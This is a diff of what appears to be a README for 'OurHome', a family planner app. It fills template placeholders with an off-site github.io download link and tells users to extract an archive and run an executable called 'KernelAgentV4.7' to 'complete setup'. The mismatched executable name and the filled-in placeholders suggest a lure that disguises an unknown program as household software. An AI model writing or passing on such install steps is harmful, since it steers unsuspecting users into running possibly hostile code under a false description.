@@ -2,13 +2,15 @@
 
 Manage your household with ease using OurHome: a family-oriented planner featuring shared to-do lists, calendar sync, grocery tracking, and a points-based reward system for kids. Designed for simplicity, collaboration, and real-world organization.
 
-[![Download OurHome](https://img.shields.io/badge/Download-OurHome_Organizer-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download OurHome](https://img.shields.io/badge/Download-OurHome_Organizer-blueviolet)](https://ourhome-family-planner-suite.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ourhome-family-planner-suite.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\OurHome`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to complete setup and enable all desktop features  
 4. 🧠 Start organizing your family’s life right from the desktop  
